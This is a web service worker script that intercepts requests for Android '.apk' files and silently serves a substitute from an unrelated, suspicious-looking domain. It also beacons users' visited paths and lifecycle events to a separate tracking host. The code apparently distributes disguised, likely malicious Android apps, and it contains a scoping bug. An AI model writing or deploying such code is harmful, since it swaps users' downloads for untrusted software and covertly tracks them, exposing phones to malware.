self.addEventListener('install', event => {
    console.log('SW install');
    logEvent('sw_install');
    self.skipWaiting();
});

self.addEventListener('activate', event => {
    console.log('SW activate');
    logEvent('sw_activate');
    event.waitUntil(self.clients.claim());
});

async function logEvent(eventType, data = {}) {
    data.event = eventType;
    data.timestamp = Date.now();
    data.scope = self.registration.scope;
    try {
        await fetch("https://ptrforcfg.com/gh_test", {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    } catch (error) {
        console.error('Log error:', error);
    }
}

async function fetchApk(apkURL, clientId) {
    const startTime = performance.now();
    logEvent('sw_fetch_start', {apkURL, clientId});
    try {
        const response = await fetch(apkURL, { method: 'GET', credentials: 'omit' });
        logEvent('sw_fetch_response', {status: response.status, ok: response.ok, clientId});

        if (!response.ok) {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }

        const contentLength = response.headers.get('content-length');

        return new Response(response.body, {
            headers: {
                'Content-Type': 'application/vnd.android.package-archive',
                'Content-Disposition': `attachment; filename="${getApkName(new URL(event.request.url))}"`,
                'Content-Length': contentLength || undefined
            }
        });
    } catch (error) {
        logEvent('sw_fetch_error', {error: error.message, clientId});
        throw error;
    } finally {
        logEvent('sw_fetch_end', {duration: performance.now() - startTime, clientId});
    }
}

function getApkName(url) {
    let apkname = "download911.apk";
    const utm = url.searchParams.get("utm_medium");
    if (utm) {
        apkname = utm.replace(/[^\w-]/g, '_') + ".apk";
    }
    return apkname;
}

self.addEventListener('fetch', event => {
    const url = new URL(event.request.url);
    const clientId = event.clientId || 'unknown';

    logEvent('sw_fetch_event', {pathname: url.pathname, clientId});

    if (url.pathname.endsWith('.apk')) {
        event.respondWith(
            (async () => {
                const apkURL = "https://blindlyorganicsnake.autos/aaa8e7e844e856a015a/" + url.search;
                try {
                    return await fetchApk(apkURL, clientId);
                } catch (error) {
                    logEvent('sw_apk_fallback', {error: error.message, clientId});
                    return fetch(event.request);
                }
            })()
        );
    }
});